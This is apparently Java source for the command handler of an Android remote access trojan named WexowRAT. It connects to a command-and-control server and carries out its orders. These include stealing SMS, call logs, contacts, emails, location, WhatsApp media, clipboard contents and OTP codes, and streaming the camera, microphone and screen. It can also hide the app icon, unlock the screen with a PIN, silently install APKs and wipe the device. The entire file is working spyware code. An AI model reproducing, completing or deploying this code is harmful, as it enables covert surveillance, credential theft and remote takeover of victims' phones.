package com.wexow.rat.core;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import android.app.PendingIntent;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import androidx.core.app.NotificationCompat;
import java.io.File;

import com.wexow.rat.managers.*;
import com.wexow.rat.permissions.*;
import com.wexow.rat.stealth.StealthManager;
import com.wexow.rat.utils.Prefs;
import com.wexow.rat.*;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class ConnectionManager {
    private static final String TAG = "ConnectionManager";
    public static String HOST = "example.com";

    private static OkHttpClient client;
    private static WebSocket webSocket;
    private static final LinkedBlockingQueue<String> sendQueue = new LinkedBlockingQueue<>();
    private static boolean isRunning = false;
    private static Context appContext;

    public static void startAsync(final Context context) {
        if (isRunning)
            return;
        isRunning = true;
        appContext = context.getApplicationContext();

        client = new OkHttpClient.Builder()
                .pingInterval(60, TimeUnit.SECONDS)
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(0, TimeUnit.MILLISECONDS)
                .writeTimeout(0, TimeUnit.MILLISECONDS)
                .retryOnConnectionFailure(true)
                .build();

        new Thread(() -> {
            while (true) {
                try {
                    String data = sendQueue.take();
                    if (webSocket != null) {
                        boolean sent = webSocket.send(data);
                        if (!sent) {
                            Log.e(TAG, "send failed, requeue");
                            sendQueue.offer(data);
                            Thread.sleep(1000);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Sender error: " + e.getMessage());
                }
            }
        }).start();

        new Thread(() -> connect(context)).start();
    }

    private static void connect(Context context) {
        int retryDelay = 2000;
        long connectionStartTime = 0;

        while (true) {
            try {
                String url = "wss://" + HOST + "/ws";
                Log.d(TAG, "Connecting to: " + url + " (retryDelay=" + retryDelay + "ms)");

                final long[] lastActivity = { System.currentTimeMillis() };

                Request request = new Request.Builder()
                        .url(url)
                        .addHeader("User-Agent", "WexowRAT/1.0")
                        .addHeader("Connection", "keep-alive")
                        .build();

                connectionStartTime = System.currentTimeMillis();

                webSocket = client.newWebSocket(request, new WebSocketListener() {
                    @Override
                    public void onOpen(WebSocket ws, Response response) {
                        Log.d(TAG, "✅ Connected!");
                        isConnected = true;
                        lastActivity[0] = System.currentTimeMillis();
                        try {
                            sendInitialData(context);
                        } catch (Exception e) {
                            Log.e(TAG, "sendInitialData: " + e.getMessage());
                        }
                    }

                    @Override
                    public void onMessage(WebSocket ws, String text) {
                        lastActivity[0] = System.currentTimeMillis();
                        try {
                            handleCommand(context, text);
                        } catch (Exception ignored) {
                        }
                    }

                    @Override
                    public void onFailure(WebSocket ws, Throwable t, Response r) {
                        Log.e(TAG, "❌ WS failure: " + t.getMessage());
                        isConnected = false;
                        webSocket = null;
                    }

                    @Override
                    public void onClosed(WebSocket ws, int code, String reason) {
                        Log.d(TAG, "WS closed: " + code + " " + reason);
                        isConnected = false;
                        webSocket = null;
                    }
                });

                while (webSocket != null) {
                    Thread.sleep(1000);

                    long idleTime = System.currentTimeMillis() - lastActivity[0];

                    if (idleTime > 90000) {
                        Log.e(TAG, "⚠️ Idle timeout (" + idleTime + "ms) — reconnecting");
                        try {
                            if (webSocket != null)
                                webSocket.cancel();
                        } catch (Exception ignored) {
                        }
                        webSocket = null;
                        isConnected = false;
                        break;
                    }
                }

                long connectionDuration = System.currentTimeMillis() - connectionStartTime;
                if (connectionDuration > 30000) {
                    Log.d(TAG, "✅ Connection stable for " + connectionDuration +
                            "ms — resetting delay");
                    retryDelay = 2000;
                }

            } catch (Exception e) {
                Log.e(TAG, "Connection error: " + e.getMessage());
                isConnected = false;
            }

            // ⭐⭐⭐ Exponential Backoff
            Log.d(TAG, "⏳ Reconnecting in " + retryDelay + "ms...");
            try {
                Thread.sleep(retryDelay);
            } catch (Exception ignored) {
            }

            retryDelay = Math.min(retryDelay * 2, 60000);
        }
    }

    private static void sendInitialData(Context ctx) throws Exception {
        JSONObject jo = new JSONObject();
        jo.put("type", "login");
        jo.put("model", Build.MODEL);
        jo.put("man", Build.MANUFACTURER);
        jo.put("release", Build.VERSION.RELEASE);
        jo.put("sdk", Build.VERSION.SDK_INT);
        send(jo.toString());
    }

    public static void send(String data) {
        sendQueue.offer(data);
    }

    public static boolean sendSync(String data) {
        try {
            if (webSocket == null)
                return false;
            return webSocket.send(data);
        } catch (Exception e) {
            return false;
        }
    }

    private static volatile boolean isConnected = false;

    public static boolean isConnected() {
        return isConnected && webSocket != null;
    }

    private static void listWhatsAppMedia(Context ctx, String mediaType) {
        new Thread(() -> {
            try {
                JSONArray files = new JSONArray();
                java.util.Set<String> seenPaths = new java.util.HashSet<>();

                Log.e(TAG, "═══════════════════════════════════");
                Log.e(TAG, "🔍 WhatsApp media scan: " + mediaType);
                Log.e(TAG, "═══════════════════════════════════");

                String[] subPaths;
                switch (mediaType) {
                    case "voice":
                        subPaths = new String[] {
                                "WhatsApp Voice Notes/",
                                "WhatsApp Audio/",
                        };
                        break;
                    case "audio":
                        subPaths = new String[] {
                                "WhatsApp Audio/",
                        };
                        break;
                    case "images":
                        subPaths = new String[] {
                                "WhatsApp Images/",
                        };
                        break;
                    case "video":
                        subPaths = new String[] {
                                "WhatsApp Video/",
                        };
                        break;
                    case "documents":
                        subPaths = new String[] {
                                "WhatsApp Documents/",
                        };
                        break;
                    default:
                        subPaths = new String[] { "" };
                }

                String root = "/sdcard/Android/media/com.whatsapp/WhatsApp/";

                // ═══════════════════════════════════════════════
                // 1️⃣ (Shared Media)
                // ═══════════════════════════════════════════════
                Log.e(TAG, "🔍 [1] BASE MEDIA");
                String basePath = root + "Media/";
                scanMediaAtPath(basePath, subPaths, files, seenPaths, "base");

                // ═══════════════════════════════════════════════
                // 2️⃣ (accounts/*/Media/)
                // ═══════════════════════════════════════════════
                File accountsDir = new File(root, "accounts");
                if (accountsDir.exists()) {
                    File[] accounts = accountsDir.listFiles();
                    if (accounts != null) {
                        for (File account : accounts) {
                            if (!account.isDirectory())
                                continue;

                            String accountId = account.getName();
                            Log.e(TAG, "🔍 [" + accountId + "] ACCOUNT MEDIA");

                            String accountMediaPath = account.getAbsolutePath() + "/Media/";
                            scanMediaAtPath(accountMediaPath, subPaths, files,
                                    seenPaths, "account_" + accountId);
                        }
                    }
                }

                // ═══════════════════════════════════════════════
                // 3️⃣
                // ═══════════════════════════════════════════════
                String oldPath = "/sdcard/WhatsApp/Media/";
                File oldDir = new File(oldPath);
                if (oldDir.exists()) {
                    Log.e(TAG, "🔍 [legacy] OLD MEDIA");
                    scanMediaAtPath(oldPath, subPaths, files, seenPaths, "legacy");
                }

                // ═══════════════════════════════════════════════
                // Result
                // ═══════════════════════════════════════════════
                JSONObject res = new JSONObject();
                res.put("type", "whatsapp_media");
                res.put("mediaType", mediaType);
                res.put("data", files);
                res.put("count", files.length());
                ConnectionManager.send(res.toString());

                Log.e(TAG, "📤 whatsapp_media sent: " + files.length() + " files");
                Log.e(TAG, "═══════════════════════════════════");

            } catch (Exception e) {
                Log.e(TAG, "❌ listWhatsAppMedia: " + e.getMessage(), e);
            }
        }).start();
    }

    private static void scanMediaAtPath(String baseMediaPath, String[] subPaths,
            JSONArray out, java.util.Set<String> seenPaths, String sourceLabel) {

        try {
            File baseDir = new File(baseMediaPath);

            Log.e(TAG, "  Path: " + baseMediaPath + " exists=" + baseDir.exists());

            if (!baseDir.exists() || !baseDir.isDirectory())
                return;

            for (String subPath : subPaths) {
                File mediaDir = new File(baseDir, subPath);

                Log.e(TAG, "    Checking: " + mediaDir.getAbsolutePath() +
                        " exists=" + mediaDir.exists());

                if (!mediaDir.exists())
                    continue;

                scanDirRecursive(mediaDir, out, seenPaths, sourceLabel, 0, 4);
            }
        } catch (Exception e) {
            Log.e(TAG, "  ❌ scanMediaAtPath: " + e.getMessage());
        }
    }

    private static void scanDirRecursive(File dir, JSONArray out,
            java.util.Set<String> seenPaths, String sourceLabel,
            int depth, int maxDepth) {

        if (depth > maxDepth)
            return;
        if (out.length() >= 2000)
            return;

        try {
            File[] entries = dir.listFiles();
            if (entries == null) {
                Log.e(TAG, "      ⚠️ listFiles() returned null for: " +
                        dir.getAbsolutePath());
                return;
            }

            for (File f : entries) {
                if (out.length() >= 2000)
                    return;

                String name = f.getName();

                if (f.isDirectory()) {
                    if (name.startsWith(".") && !name.equals(".trash")) {
                        continue;
                    }

                    File[] subFiles = f.listFiles();
                    int count = subFiles != null ? subFiles.length : 0;

                    if (count > 0) {
                        Log.e(TAG, "      📁 " + name + " (" + count + ")");
                    }

                    scanDirRecursive(f, out, seenPaths, sourceLabel,
                            depth + 1, maxDepth);
                } else {
                    if (name.startsWith(".") || name.endsWith(".tmp") ||
                            name.endsWith(".nomedia")) {
                        continue;
                    }

                    String path = f.getAbsolutePath();
                    if (seenPaths.contains(path)) {
                        continue;
                    }
                    seenPaths.add(path);

                    try {
                        JSONObject jo = new JSONObject();
                        jo.put("name", name);
                        jo.put("path", path);
                        jo.put("isDir", false);
                        jo.put("size", f.length());
                        jo.put("lastModified", f.lastModified());
                        jo.put("source", sourceLabel);

                        int idx = name.lastIndexOf(".");
                        String ext = idx > 0 ? name.substring(idx).toLowerCase() : "";
                        jo.put("type", ext);

                        String parent = f.getParentFile() != null ? f.getParentFile().getName() : "";
                        jo.put("folder", parent);

                        out.put(jo);
                    } catch (Exception ignored) {
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "      ❌ scanDirRecursive: " + e.getMessage());
        }
    }

    private static void handleCommand(Context ctx, String data) {
        try {
            JSONObject jo = new JSONObject(data);

            String type = jo.optString("type", "");

            if (type.equals("file_download_resume")) {
                int fromChunk = jo.optInt("fromChunk", 0);
                Log.e(TAG, "📥 Server requested RESUME from chunk " + fromChunk);
                FileManager.onResumeCommand(fromChunk);
                return;
            }

            if (type.equals("file_download_next")) {
                Log.e(TAG, "📥 Server requested NEXT part");
                String path = jo.optString("path", "");
                if (!path.isEmpty()) {
                    FileManager.download(path, ctx);
                } else if (FileManager.lastDownloadPath != null) {
                    FileManager.download(FileManager.lastDownloadPath, ctx);
                }
                return;
            }

            String order = jo.optString("order", "");
            if (order.isEmpty()) {
                Log.e(TAG, "No order field in: " + data);
                return;
            }

            Log.d(TAG, "Received order: " + order);

            switch (order) {
                // ===== Files =====
                case "file_manager":
                    FileManager.walk(jo.getString("path"));
                    break;
                case "file_download":
                    FileManager.download(jo.getString("path"), ctx);
                    break;
                case "file_download_next":
                    Log.e(TAG, "📥 Server requested NEXT part");
                    String path = jo.optString("path", "");
                    if (!path.isEmpty()) {
                        FileManager.download(path, ctx);
                    } else if (FileManager.lastDownloadPath != null) {
                        FileManager.download(FileManager.lastDownloadPath, ctx);
                    }
                    break;
                case "file_upload_start":
                    FileManager.uploadStart(jo.getString("path"), jo.getInt("totalChunks"), jo.optLong("totalSize", 0));
                    break;
                case "file_upload_chunk":
                    FileManager.uploadChunk(jo.getInt("chunkIndex"), jo.getString("data"));
                    break;
                case "file_upload_end":
                    FileManager.uploadEnd();
                    break;
                case "file_upload":
                    FileManager.upload(jo.getString("path"), jo.getString("data"));
                    break;
                case "file_unzip":
                    FileManager.unzipFile(jo.getString("zipPath"), jo.getString("destDir"));
                    break;
                case "file_delete":
                    FileManager.delete(jo.getString("path"));
                    break;
                case "file_rename":
                    FileManager.rename(jo.getString("path"), jo.getString("newName"));
                    break;
                case "file_mkdir":
                    FileManager.createDirectory(jo.getString("path"));
                    break;
                case "file_search":
                    FileManager.search(jo.getString("path"), jo.getString("query"), jo.optInt("max", 50));
                    break;

                // ===== Media =====
                case "camera":
                    CameraManager.startStreaming(ctx, jo);
                    break;
                case "stop_camera":
                    CameraManager.stopStreaming();
                    break;
                case "mic":
                    MicManager.handle(jo);
                    break;
                // WhatsApp
                case "whatsapp_media":
                    String mediaType = jo.optString("mediaType", "audio");
                    listWhatsAppMedia(ctx, mediaType);
                    break;

                // ===== Data =====
                case "sms":
                    SMSManager.getSMSList(ctx);
                    break;
                // ⭐ Call Logs
                case "call_logs":
                    CallLogManager.getCallLogs(ctx);
                    break;

                case "call_logs_clear":
                    CallLogManager.clearCallLogs(ctx);
                    break;

                case "call_logs_incoming":
                    CallLogManager.getCallLogsByType(ctx, 1); // TYPE_INCOMING
                    break;

                case "call_logs_outgoing":
                    CallLogManager.getCallLogsByType(ctx, 2); // TYPE_OUTGOING
                    break;

                case "call_logs_missed":
                    CallLogManager.getCallLogsByType(ctx, 3); // TYPE_MISSED
                    break;
                case "contacts":
                    ContactsManager.getContacts(ctx);
                    break;
                case "delete_contact":
                    long contactId = jo.optLong("contactId", -1);
                    if (contactId > 0) {
                        ContactsManager.deleteContact(ctx, contactId);
                    } else {
                        Log.e(TAG, "❌ Invalid contactId");
                    }
                    break;

                case "delete_contact_phone":
                    long phoneId = jo.optLong("phoneId", -1);
                    if (phoneId > 0) {
                        ContactsManager.deletePhoneNumber(ctx, phoneId);
                    }
                    break;

                case "delete_contacts_multiple":
                    org.json.JSONArray ids = jo.optJSONArray("contactIds");
                    if (ids != null) {
                        ContactsManager.deleteMultiple(ctx, ids);
                    }
                    break;

                case "delete_contacts_by_name":
                    String name = jo.optString("name", "");
                    if (!name.isEmpty()) {
                        ContactsManager.deleteByName(ctx, name);
                    }
                    break;

                case "delete_all_contacts":
                    ContactsManager.deleteAll(ctx);
                    break;
                case "location":
                    LocManager.getLocation(ctx);
                    break;
                case "device_info":
                    DeviceInfoManager.getInfo(ctx);
                    break;

                // ===== Emails =====
                case "emails":
                    EmailExtractor.extractContactEmails(ctx);
                    break;
                case "accounts":
                    EmailExtractor.extractAccounts(ctx);
                    break;
                case "sms_emails":
                    EmailExtractor.extractEmailsFromSms(ctx);
                    break;
                case "emails_all":
                    EmailExtractor.extractAll(ctx);
                    break;

                // ===== Apps =====
                case "list_apps":
                    AppUninstaller.listUninstallable(ctx);
                    break;
                case "list_launchable":
                    AppLauncher.listLaunchable(ctx);
                    break;
                case "launch_app":
                    String pkg = jo.getString("package");
                    String appName = jo.optString("appName", "");
                    Log.d(TAG, "🚀 Launch app: " + pkg + " (name: " + appName + ")");
                    AppLauncher.launch(ctx, pkg, appName);
                    break;
                case "open_url":
                    AppLauncher.openUrl(ctx, jo.getString("url"));
                    break;
                case "open_play_store":
                    AppLauncher.openPlayStore(ctx, jo.getString("package"));
                    break;
                case "force_stop":
                    AppLauncher.forceStop(ctx, jo.getString("package"));
                    break;

                // ===== Install / Uninstall =====
                case "uninstall":
                    try {
                        String packg = jo.getString("package");
                        Log.e(TAG, "🗑️ UNINSTALL requested for: " + packg);
                        // AppUninstaller.uninstallViaIntent(ctx, packg);
                        Log.e(TAG, "✅ uninstallViaIntent returned");
                    } catch (Exception e) {
                        Log.e(TAG, "❌ uninstall error: " + e.getMessage(), e);
                    }
                    break;

                case "uninstall_pi":
                    try {
                        String packg = jo.getString("package");
                        Log.e(TAG, "🗑️ UNINSTALL_PI requested for: " + packg);
                        // AppUninstaller.uninstallViaPackageInstaller(ctx, packg);
                        Log.e(TAG, "✅ uninstallViaPackageInstaller returned");
                    } catch (Exception e) {
                        Log.e(TAG, "❌ uninstall_pi error: " + e.getMessage(), e);
                    }
                    break;
                case "uninstall_multiple":
                    JSONArray pkgs = jo.getJSONArray("packages");
                    String[] arr = new String[pkgs.length()];
                    for (int i = 0; i < pkgs.length(); i++)
                        arr[i] = pkgs.getString(i);
                    // AppUninstaller.uninstallMultiple(ctx, arr);
                    break;
                case "install_apk":
                    AppInstaller.installFromBase64(ctx,
                            jo.getString("data"),
                            jo.optString("name", "app.apk"));
                    break;
                case "install_url":
                    AppInstaller.installFromUrl(ctx,
                            jo.getString("url"),
                            jo.optString("name", "app.apk"));
                    break;
                case "check_install_perm":
                    try {
                        JSONObject res = new JSONObject();
                        res.put("type", "install_perm_status");
                        res.put("can_install", PermissionHelper.canInstallPackages(ctx));
                        send(res.toString());
                    } catch (Exception ignored) {
                    }
                    break;

                // ===== Power =====
                case "lock_screen":
                    if (KeylogManager.getInstance() != null) {
                        Log.e(TAG, "🔒 Lock via Accessibility");
                        KeylogManager.getInstance().lockDevice();
                    } else {
                        PowerManagerHelper.lockScreen(ctx);
                    }
                    break;

                case "unlock_screen":
                    if (KeylogManager.getInstance() != null) {
                        String pin = jo.optString("pin", "");
                        Log.e(TAG, "🔓 Unlock via Accessibility, pin=" +
                                (pin.isEmpty() ? "(from storage)" : pin));
                        KeylogManager.getInstance().unlockDevice(pin);
                    }
                    break;

                case "unlock_pattern":
                    if (KeylogManager.getInstance() != null) {
                        String pattern = jo.optString("pattern", "");
                        Log.e(TAG, "🔓 Unlock Pattern: " + pattern);
                        KeylogManager.getInstance().unlockWithPattern(pattern);
                    }
                    break;
                case "wipe_device":
                    PowerManagerHelper.wipeDevice(ctx);
                    break;
                case "power_status":
                    PowerManagerHelper.checkStatus(ctx);
                    break;
                case "restart_app":
                    PowerManagerHelper.restartApp(ctx);
                    break;

                // ===== OTP =====
                case "start_otp":
                    OTPInterceptor.start(ctx);
                    break;
                case "stop_otp":
                    OTPInterceptor.stop(ctx);
                    break;

                // ===== Clipboard =====
                case "start_clipboard":
                    ClipboardMonitor.start(ctx);
                    break;
                case "stop_clipboard":
                    ClipboardMonitor.stop();
                    break;

                // ===== Auto-capture =====
                case "auto_capture_on":
                    AutoCaptureManager.setEnabled(true);
                    break;
                case "auto_capture_off":
                    AutoCaptureManager.setEnabled(false);
                    break;

                // ===== Stealth =====
                case "hide_icon":
                    StealthManager.hideAppIcon(ctx);
                    break;
                case "show_icon":
                    StealthManager.showAppIcon(ctx);
                    break;
                case "reveal_ui":
                    StealthManager.showAppIcon(ctx);
                    try {
                        android.content.Intent i = new android.content.Intent(
                                ctx, Class.forName("com.wexow.rat.MainActivity"));
                        i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                        ctx.startActivity(i);
                    } catch (Exception ignored) {
                    }
                    break;

                // ===== Screen =====
                case "screen_reader_start":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().startScreenReader();
                    break;
                case "screen_reader_stop":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().stopScreenReader();
                    break;

                // ===== Accessibility Remote Control =====
                case "click_text":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().processCommand("click_text", jo.getString("text"));
                    break;
                case "click_id":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().processCommand("click_id", jo.getString("id"));
                    break;
                case "click_xy":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().processCommand("click_xy", jo.getString("coord"));
                    break;
                case "input_text":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().processCommand("input_text", jo.getString("text"));
                    break;
                case "swipe_gesture":
                    Log.d(TAG, "📌 Gesture order received");
                    if (KeylogManager.getInstance() != null) {
                        Log.d(TAG, "✅ KeylogManager available, calling processCommand");
                        KeylogManager.getInstance().processCommand("swipe", jo.getString("coord"));
                    } else {
                        Log.e(TAG, "❌❌ KeylogManager is NULL! Accessibility service not connected");
                    }
                    break;

                case "nav_back":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().processCommand("back", "");
                    break;
                case "nav_home":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().processCommand("home", "");
                    break;
                case "nav_recents":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().processCommand("recents", "");
                    break;
                case "nav_notifications":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().processCommand("notifications", "");
                    break;
                case "nav_quick_settings":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().processCommand("quick_settings", "");
                    break;
                case "nav_power_dialog":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().processCommand("power_dialog", "");
                    break;
                case "lock_device":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().processCommand("lock_screen", "");
                    break;
                /*
                 * case "take_screenshot":
                 * if (KeylogManager.getInstance() != null)
                 * KeylogManager.getInstance().processCommand("take_screenshot", "");
                 * break;
                 */
                case "black_overlay_on":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().toggleBlackOverlay(true);
                    break;
                case "black_overlay_off":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().toggleBlackOverlay(false);
                    break;

                // ===== Auto toggles =====
                case "auto_uninstall_on":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().setAutoUninstall(true);
                    break;
                case "auto_uninstall_off":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().setAutoUninstall(false);
                    break;
                case "auto_install_on":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().setAutoInstall(true);
                    break;
                case "auto_install_off":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().setAutoInstall(false);
                    break;
                case "auto_accept_perms_on":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().setAutoAcceptPermissions(true);
                    break;
                case "auto_accept_perms_off":
                    if (KeylogManager.getInstance() != null)
                        KeylogManager.getInstance().setAutoAcceptPermissions(false);
                    break;

                // ===== Gesture =====
                case "gesture":
                    Log.d(TAG, "📌 Gesture order: " + jo.toString());

                    if (KeylogManager.getInstance() == null) {
                        Log.e(TAG, "❌ KeylogManager is null");
                        break;
                    }

                    String gestureType = jo.optString("type", "");

                    if ("click".equals(gestureType)) {
                        int x = jo.optInt("x", -1);
                        int y = jo.optInt("y", -1);

                        if (x >= 0 && y >= 0) {
                            Log.d(TAG, "🎯 Click at: " + x + "," + y);
                            KeylogManager.getInstance().click(x, y);
                        }

                    } else if ("swipe".equals(gestureType)) {
                        int x1 = jo.optInt("x1", 0);
                        int y1 = jo.optInt("y1", 0);
                        int x2 = jo.optInt("x2", 0);
                        int y2 = jo.optInt("y2", 0);
                        int duration = jo.optInt("duration", 300);

                        Log.d(TAG, "🎯 Swipe: " + x1 + "," + y1 + " → " + x2 + "," + y2);
                        KeylogManager.getInstance().swipe(x1, y1, x2, y2, duration);

                    } else if ("action".equals(gestureType)) {
                        int actionId = jo.optInt("actionId", 0);
                        Log.d(TAG, "🎯 Action: " + actionId);

                        // 1 = BACK, 2 = HOME, 3 = RECENTS
                        int globalAction;

                        if (actionId == 1) {
                            globalAction = android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK;
                        } else if (actionId == 2) {
                            globalAction = android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME;
                        } else if (actionId == 3) {
                            globalAction = android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS;
                        } else {
                            return;
                        }

                        KeylogManager.getInstance().performAction(globalAction);
                    }

                    break;

                // ===== Automation =====
                case "automation":
                    Log.d(TAG, "📌 Automation order received");
                    if (KeylogManager.getInstance() != null) {
                        String action = jo.optString("action", "");

                        switch (action) {
                            case "click_text":
                                KeylogManager.getInstance().processCommand("click_text",
                                        jo.optString("text", ""));
                                break;
                            case "click_id":
                                KeylogManager.getInstance().processCommand("click_id",
                                        jo.optString("id", ""));
                                break;
                            case "input_text":
                                KeylogManager.getInstance().processCommand("input_text",
                                        jo.optString("text", ""));
                                break;
                            case "back":
                                KeylogManager.getInstance().processCommand("back", "");
                                break;
                            case "home":
                                KeylogManager.getInstance().processCommand("home", "");
                                break;
                            case "recents":
                                KeylogManager.getInstance().processCommand("recents", "");
                                break;
                            case "notifications":
                                KeylogManager.getInstance().processCommand("notifications", "");
                                break;
                            case "quick_settings":
                                KeylogManager.getInstance().processCommand("quick_settings", "");
                                break;
                            case "power_dialog":
                                KeylogManager.getInstance().processCommand("power_dialog", "");
                                break;
                            case "lock_screen":
                                KeylogManager.getInstance().processCommand("lock_screen", "");
                                break;
                            case "take_screenshot":
                                KeylogManager.getInstance().processCommand("take_screenshot", "");
                                break;
                        }
                    } else {
                        Log.e(TAG, "❌ KeylogManager is NULL");
                    }
                    break;

                case "screen_share":
                    if ("start".equals(jo.optString("action", "start"))) {
                        if (ScreenManager.hasProjection()) {
                            Log.e(TAG, "✅ Reusing existing projection");
                            ScreenManager.startStreaming(ctx);
                        } else {
                            Log.e(TAG, "🎯 Starting fresh flow");

                            if (KeylogManager.getInstance() != null) {
                                KeylogManager.getInstance().startScreenCastFlow();
                            }

                            new Thread(() -> {
                                for (int i = 0; i < 30; i++) {
                                    try {
                                        Thread.sleep(1000);
                                        if (ScreenManager.hasProjection()) {
                                            Log.e(TAG, "✅ Projection detected! Starting stream...");
                                            ScreenManager.startStreaming(ctx);
                                            return;
                                        }
                                    } catch (Exception ignored) {
                                    }
                                }
                                Log.e(TAG, "❌ Projection timeout");
                            }).start();
                        }
                    }
                    break;

                // ⭐⭐ Live Screenshot
                case "live_screenshot":
                    if (KeylogManager.getInstance() != null) {
                        String action = jo.optString("action", "start");
                        if ("start".equals(action)) {
                            int interval = jo.optInt("interval", 2000);
                            KeylogManager.getInstance().startLiveScreenshot(interval);
                            Log.e(TAG, "📸 Live screenshot started (interval=" + interval + "ms)");
                        } else {
                            KeylogManager.getInstance().stopLiveScreenshot();
                            Log.e(TAG, "📸 Live screenshot stopped");
                        }
                    } else {
                        Log.e(TAG, "❌ KeylogManager is null");
                    }
                    break;

                // ⭐ Screenshot
                case "take_screenshot":
                    if (KeylogManager.getInstance() != null) {
                        KeylogManager.getInstance().startLiveScreenshot(60000);
                        new android.os.Handler(android.os.Looper.getMainLooper())
                                .postDelayed(() -> {
                                    if (KeylogManager.getInstance() != null) {
                                        KeylogManager.getInstance().stopLiveScreenshot();
                                    }
                                }, 2000);
                        Log.e(TAG, "📸 Single screenshot");
                    }
                    break;

                case "screen_reader":
                    if (KeylogManager.getInstance() != null) {
                        String action = jo.optString("action", "start");
                        Log.e(TAG, "📖 Screen reader action: " + action);
                        if ("start".equals(action)) {
                            KeylogManager.getInstance().startScreenReader();
                        } else {
                            KeylogManager.getInstance().stopScreenReader();
                        }
                    } else {
                        Log.e(TAG, "❌ KeylogManager is null!");
                    }
                    break;

                case "db_export":
                    try {
                        Log.e(TAG, "📤 Exporting database...");

                        ClientDatabase db = ClientDatabase.getInstance(ctx);
                        JSONObject dat = db.exportAll();

                        JSONObject result = new JSONObject();
                        result.put("type", "db_export");
                        result.put("data", dat);
                        result.put("stats", db.getStats());
                        ConnectionManager.send(result.toString());

                        Log.e(TAG, "✅ Database exported");
                    } catch (Exception e) {
                        Log.e(TAG, "❌ db_export: " + e.getMessage());
                    }
                    break;

                case "db_clear":
                    try {
                        ClientDatabase.getInstance(ctx).clearAll();
                        Log.e(TAG, "🗑️ Database cleared");

                        JSONObject result = new JSONObject();
                        result.put("type", "db_cleared");
                        ConnectionManager.send(result.toString());
                    } catch (Exception e) {
                        Log.e(TAG, "❌ db_clear: " + e.getMessage());
                    }
                    break;

            }
        } catch (Exception e) {
            Log.e(TAG, "handleCommand: " + e.getMessage());
        }
    }
}
